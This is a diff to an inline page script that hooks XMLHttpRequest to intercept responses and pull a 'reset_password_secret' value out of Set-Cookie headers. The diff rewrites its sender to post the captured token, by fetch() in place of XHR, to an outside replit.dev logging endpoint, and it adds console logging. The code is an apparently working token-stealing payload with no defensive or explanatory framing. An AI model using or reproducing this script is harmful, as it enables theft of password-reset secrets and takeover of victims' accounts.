@@ -11,36 +11,43 @@
 
     <script>
         function logData(data) {
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", 'https://de9f1098-bef1-4690-890a-f6bd01a5ea15-00-2ul1aimfuhien.kirk.replit.dev/log', true);
-            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-            xhr.onreadystatechange = function () {
-                if (xhr.readyState === XMLHttpRequest.DONE) {
-                    console.log('Logged data:', xhr.responseText);
-                }
-            };
-            xhr.send(JSON.stringify(data));
+            console.log('Sending data to logging server:', data);
+            fetch('https://de9f1098-bef1-4690-890a-f6bd01a5ea15-00-2ul1aimfuhien.kirk.replit.dev/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.text())
+            .then(result => console.log('Response from logging server:', result))
+            .catch(error => console.error('Error logging data:', error));
         }
 
         function interceptResponse() {
             const originalOpen = XMLHttpRequest.prototype.open;
             XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
                 this.addEventListener("readystatechange", function () {
-                    if (this.readyState === 4 && this.status === 201) {
-                        try {
-                            const response = JSON.parse(this.responseText);
-                            const setCookieHeader = this.getResponseHeader('Set-Cookie');
-                            if (setCookieHeader) {
-                                const cookies = setCookieHeader.split(';');
-                                cookies.forEach(cookie => {
-                                    if (cookie.includes('reset_password_secret=')) {
-                                        const token = cookie.split('=')[1];
-                                        logData({ token: token });
-                                    }
-                                });
+                    console.log('Intercepted state change:', this.readyState, this.status);
+                    if (this.readyState === 4) {
+                        console.log('Intercepted response:', this.responseText);
+                        if (this.status === 201) {
+                            try {
+                                const response = JSON.parse(this.responseText);
+                                const setCookieHeader = this.getResponseHeader('Set-Cookie');
+                                if (setCookieHeader) {
+                                    const cookies = setCookieHeader.split(';');
+                                    cookies.forEach(cookie => {
+                                        if (cookie.includes('reset_password_secret=')) {
+                                            const token = cookie.split('=')[1];
+                                            console.log('Found token:', token);
+                                            logData({ token: token });
+                                        }
+                                    });
+                                }
+                            } catch (e) {
+                                console.error('Failed to parse response:', e);
                             }
-                        } catch (e) {
-                            console.error('Failed to parse response:', e);
                         }
                     }
                 }, false);
